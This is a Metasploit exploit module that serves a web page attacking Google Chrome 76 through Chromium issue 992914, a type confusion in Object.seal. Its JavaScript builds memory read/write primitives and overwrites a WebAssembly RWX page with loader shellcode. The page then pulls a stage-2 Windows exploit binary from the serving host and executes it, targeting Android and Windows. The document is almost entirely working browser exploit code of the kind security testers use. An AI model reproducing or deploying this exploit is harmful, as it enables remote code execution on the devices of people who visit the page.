##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core/payload/windows/addr_loader'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Payload::Windows::AddrLoader

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Google Chrome 76 Object.seal exploit',
      'Description'    => %q{
        Chrome stable exploit for chromium issue 992914
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
          'IstvÃ¡n Kurucsai', # exploit
          'AmesianX', # 32bit exploit
          'timwr', # metasploit module
        ],
      'References'     => [
          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=992914'],
          ['URL', 'https://github.com/exodusintel/Chrome-Issue-992914-Sealed-Frozen-Element-Kind-Type-Confusion-RCE-Exploit'],
          ['URL', 'https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/'],
          ['URL', 'https://github.com/AmesianX/Chrome_Issue992914'],
          ['URL', 'https://powerhacker.net/forum/security-research/377-chrome-issue-992914-32-bit-conversion-analysis-report'],
        ],
      'Targets'        => [
          [ 'Android armle',
            {
              'Platform' => ['android', 'linux'],
              'Payload'  => { 'Space' => 2048, },
              'Arch' => ARCH_ARMLE
            }
          ],
          [ 'Windows x86 --no-sandbox',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86,
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 12 2019'))
    register_advanced_options([
      OptBool.new('DEBUG_EXPLOIT', [false, "Show debug information during exploitation", false]),
    ])
  end

  def on_request_uri(cli, request)

    if datastore['DEBUG_EXPLOIT'] && request.uri =~ %r{/print$}
      print_status("[*] " + request.body)
      send_response(cli, '')
      return
    end

    print_status("Sending #{request.uri} to #{request['User-Agent']}")
    uripath = datastore['URIPATH'] || get_resource
    uripath += '/' unless uripath.end_with? '/'


    if request.uri =~ %r{/payload$}
      path = ::File.join Msf::Config.data_directory, 'exploits', 'CVE-2019-0808', 'exploit.bin'
      loader_data = ::File.binread(path)
      #loader_data = payload.raw
      loader_data = loader_data + "a" * (0x14000 - loader_data.length)
      #print_error(Rex::Text.to_hex(loader_data))
      send_response(cli, loader_data, {'Content-Type' => 'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      print_good("Sent stage2 exploit #{loader_data.length}")
    end

    loader = generate_loader
    #print_error(Rex::Text.to_hex(loader[0]))
    #print_error(loader[1].to_s + "lol" + loader[2].to_s)
    shellcode = loader[0]
    shellcode_addr_offset = loader[1]
    shellcode_size_offset = loader[2]
    jscript = %Q^

// HELPER FUNCTIONS
let ab = new ArrayBuffer(16);
let float_view = new Float64Array(ab);
let bint_view = new BigUint64Array(ab);
let sint_view = new Uint32Array(ab);
Number.prototype.float_to_high_32bit = function() {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] >> 32n) & 0xffffffffn;
    return sint_view[0];
}
Number.prototype.float_to_low_32bit = function() {
    float_view[0] = this;
    bint_view[0] = bint_view[0] & 0xffffffffn;
    return sint_view[0];
}
Number.prototype.setHighUint32 = function(val) {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] & 0x00000000ffffffffn) | (BigInt(val) << 32n);
    return float_view[0];
}
Number.prototype.setLowUint32 = function(val) {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] & 0xffffffff00000000n) | BigInt(val);
    return float_view[0];
}

var float_array;
var tarr;
var obj_addrof;
var view;

function exploit() {
    const o = {foo: 0x41414141};
    for (let i = 0; i < 15; i++) {
        o[i] = i+16;
    }

    // the first corruption target
    float_array = [0x41414141];

    // second corruption target
    tarr = new Uint32Array(2);
    tarr[0] = 0x31313131;
    tarr[1] = 0x32323232;

    view = new DataView(tarr.buffer);

    // object used to imlpement the addrof primitive
    obj_addrof = {'a': 0x31323334/2, 'b': 1};
    obj_addrof['b'] = obj_addrof;

    // build a NumberDictionary inside the FixedArray
    o[0] = 0x08;    // number of elements
    o[1] = 0;       // number of deleted elements
    o[2] = 0x08;    // capacity;
    o[3] = 0x32;    // max key/requires slow elements
    // first element of the NumberDictionary
    o[4] = 0;       // key
    o[5] = 0x4141;  // value
    o[6] = 0xc0;    // PropertyDesc

    Object.seal(o);

    const v12 = {foo: 0x42424242};
    Object.preventExtensions(v12);
    Object.seal(v12);

    const v18 = {foo: Object};
    v12.__proto__ = 0;

    o[0] = 0x4242;

    delete o[1];

    if (float_array[2] !== undefined) {
        print('-------------------------------------------------------------');
        print('[BEFORE] float_array[4]: ' + float_array[4].float_to_low_32bit().toString(16));
        print('[BEFORE] float_array[4]: ' + float_array[4].float_to_high_32bit().toString(16));

        // tarr.byteLength
        float_array[3] = float_array[3].setHighUint32(0xC8C8);
        // tarr.length
        float_array[4] = float_array[4].setLowUint32(0xC8C8);
        // tarr.buffer
        // float_array[8] = float_array[8].setHighUint32(0x00400000n);
        // view.byteLength
        float_array[15] = float_array[15].setLowUint32(0xC8C8);

        print('-------------------------------------------------------------');
        print('[AFTER] float_array[4]: ' + float_array[4].float_to_low_32bit().toString(16));
        print('[AFTER] float_array[4]: ' + float_array[4].float_to_high_32bit().toString(16));
        print('-------------------------------------------------------------');
        print('[OOB] tarr.length: ' + tarr.length);
        print('[OOB] tarr.byteLength: ' + tarr.byteLength);
        print('-------------------------------------------------------------');
        print('[OOB] view.byteLength: ' + view.byteLength);
        print('-------------------------------------------------------------');

        for (i = 0; i < 20; i++) {
            print('[64bit][32bit_low ] float_array[' + (i).toString() + ']: ' + float_array[i].float_to_low_32bit().toString(16));
            print('[64bit][32bit_high] float_array[' + (i).toString() + ']: ' + float_array[i].float_to_high_32bit().toString(16));
        }

        return true;
    }

    return false;
}

function rce() {
    function get_wasm_func() {
        var importObject = {
            imports: { imported_func: arg => print(arg) }
        };
        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
        wasm_code = new Uint8Array(bc);
        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
        return wasm_mod.exports.exported_func;
    }

    const obj_prop_b_offset = 19;
    const tarr_buf_offset = 8;
    let memory = {
        addrof(o) {
            obj_addrof['b'] = o;
            return float_array[obj_prop_b_offset].float_to_low_32bit();
        },
    };

    var req = new XMLHttpRequest();
    req.open('GET', '#{uripath}payload', false);
    req.overrideMimeType('text\/plain; charset=x-user-defined');
    req.send(null);
    if (req.status != 200) {
      return;
    }
    let payload_size = req.responseText.length;
    let payload_array = new ArrayBuffer(payload_size);
    let payload8 = new Uint8Array(payload_array);
    for (let i = 0; i < req.responseText.length; i++) {
      payload8[i] = req.responseText.charCodeAt(i) & 0xff;
    }
    let payload_array_addr = memory.addrof(payload_array) + 15;
    print('payload addr: 0x' + payload_array_addr.toString(16));

    let wasm_func = get_wasm_func();
    // traverse the JSFunction object chain to find the RWX WebAssembly code page
    let wasm_func_addr = memory.addrof(wasm_func) - 1;
    print('wasm addr: 0x' + wasm_func_addr.toString(16));
    //--------------------------------------------------------------------------------------
    let original = float_array[tarr_buf_offset].float_to_high_32bit();
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(wasm_func_addr + 12);
    let sfi = view.getUint32(0, true) - 1;
    print('sfi: 0x' + sfi.toString(16));
    //--------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(sfi + 4);
    let WasmExportedFunctionData = view.getUint32(0, true) - 1;
    print('WasmExportedFunctionData: 0x' + WasmExportedFunctionData.toString(16));
    //--------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(payload_array_addr);
    let payload_data = view.getUint32(0, true);
    print('payload_data: 0x' + payload_data.toString(16));
    //--------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(WasmExportedFunctionData + 8);
    let instance = view.getUint32(0, true) - 1;
    print('instance: 0x' + instance.toString(16));
    //-------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(instance + 0x44);
    let rwx_addr = view.getUint32(0, true);
    print('rwx: 0x' + rwx_addr.toString(16));
    //--------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(rwx_addr);
    let shellcode = new Uint8Array([#{Rex::Text::to_num(shellcode)}]);
    for (let i = 0; i < shellcode.length; i++) {
        view.setUint8(i, shellcode[i]);
    }
    view.setUint32(#{shellcode_addr_offset}, payload_data, true);
    view.setUint32(#{shellcode_size_offset}, payload_size, true);
    let load_addr = view.getUint32(#{shellcode_addr_offset}, true);
    print('load_addr: 0x' + load_addr.toString(16));
    let load_size = view.getUint32(#{shellcode_size_offset}, true);
    print('load_size: 0x' + load_size.toString(16));
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(original);
    //--------------------------------------------------------------------------------------
    // invoke the shellcode
    alert(1);
    wasm_func();
}

function try_exploit() {
    for (let i=0;i<500;i++) {
        try {
            if (exploit()) {
                rce();
            }
        } catch {
        }
    }

    print('[!] Float array corruption unsuccessful, RESTARTING!');
    setTimeout(function() { location.reload(); }, 400);
}

setTimeout(try_exploit, 400);
^

    if datastore['DEBUG_EXPLOIT']
      debugjs = %Q^
print = function(arg) {
  var request = new XMLHttpRequest();
  request.open("POST", "/print", false);
  request.send("" + arg);
};
^
      jscript = "#{debugjs}#{jscript}"
    else
      jscript.gsub!(/\/\/.*$/, '') # strip comments
      jscript.gsub!(/^\s*print\s*\(.*?\);\s*$/, '') # strip print(*);
    end

    html = %Q^
<html>
<head>
<script>
#{jscript}
</script>
</head>
<body>
</body>
</html>
^
    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
  end

end
